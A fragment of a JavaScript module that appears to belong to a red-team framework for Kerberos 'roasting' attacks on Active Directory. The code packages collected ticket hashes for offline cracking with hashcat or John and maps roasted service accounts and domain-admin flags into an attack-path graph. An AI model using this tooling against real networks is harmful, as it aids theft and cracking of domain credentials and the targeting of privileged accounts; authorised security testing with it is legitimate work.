        ? hashes.length + ' hashcat/john-ready line(s) collected — crack-material for OFFLINE operator-side tooling; the requests were ordinary Kerberos traffic, and what the defender LOGGED about them is the edrview oracle\'s verdict (DC Security 4768/4769), never a claim.'
        : 'no formattable tickets in this result — see errors[] for the honest per-account outcome.',
    },
  };
}

// The graph hand-off: normalize an adroast.collected event's fields into the items
// engine/graphquery.mjs ingests (account -> SPN -> host edges, DA-class flags).
export function roastGraphItems(fields) {
  const accounts = (fields.accounts || []).map((a) => ({
    user: a.user,
    daClass: a.daClass === true || a.adminCount === 1 || (a.groups || []).some((g) => /\b(domain admins|enterprise admins|administrators)\b/i.test(String(g))),
    spns: a.spns || [],
  }));
  // SPNs named only on hash lines (enum-less collection) still land as edges.
  for (const h of fields.hashes || []) {
    if (h.kind !== 'krb5tgs' || !h.spn) continue;
    let acc = accounts.find((a) => a.user === h.user);
    if (!acc) { acc = { user: h.user, daClass: false, spns: [] }; accounts.push(acc); }
    if (!acc.spns.includes(h.spn)) acc.spns.push(h.spn);
  }
  return { dc: fields.dc || null, realm: fields.realm || null, accounts };
}

export const __internals = { kerbInt, buildPrincipalName, parsePrincipalName, parseEncryptedData, unwrapGssApi };
